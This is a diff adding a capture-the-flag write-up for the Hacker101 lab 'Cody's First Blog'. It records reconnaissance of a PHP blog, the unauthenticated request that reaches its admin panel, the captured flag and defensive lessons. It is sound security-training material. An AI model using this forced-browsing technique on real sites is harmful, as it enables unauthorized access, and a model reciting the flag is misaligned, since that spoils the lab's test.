@@ -1,0 +1,55 @@
+================================
+LAB: Cody's First Blog - FLAG #1
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 15, 2026
+Lab URL: https://868c57e9406a8f440011476736aa1cd8.ctf.hacker101.com
+Category: Web Security
+Level: Moderate
+Objective: Find hidden flags through web vulnerabilities
+Description: PHP blog application with comment system and admin panel
+
+[RECONNAISSANCE]
+----------------
+Initial GET request to / revealed:
+- PHP 5.5.9-1ubuntu4.24 backend
+- Parameter ?page= used for page inclusion
+- HTML comment: <!--<a href="?page=admin.auth.inc">Admin login</a>-->
+- Comment form accepting POST with 'body' parameter
+
+Tested ?page=admin.auth.inc:
+- Returns login form with username/password fields
+- Confirms page parameter is functional
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Broken Access Control - no session verification on admin panel.
+
+admin.auth.inc exists (login page) → probable admin.inc exists (admin panel).
+Direct access to admin.inc has no authentication check.
+
+[EXPLOITATION]
+--------------
+Request:
+GET /?page=admin.inc HTTP/2
+
+No credentials required.
+
+[EVIDENCE]
+----------
+Response contained:
+<h1>Admin</h1>
+<h2>Pending Comments</h2>
+[...list of pending comments with approval links...]
+<p>Admin flag is ^FLAG^60bfd6d26a174c5df35607c9be0360be40ad17fd1b0a9453e7f1d2cb8d765349$FLAG$</p>
+
+FLAG #1: ^FLAG^60bfd6d26a174c5df35607c9be0360be40ad17fd1b0a9453e7f1d2cb8d765349$FLAG$
+
+[LESSONS LEARNED]
+-----------------
+- Authentication must be enforced on ALL protected pages, not just login entry point
+- Predictable file naming (auth.inc → inc) enables enumeration
+- Implement centralized session validation for admin sections
+- Use proper access control middleware/guards
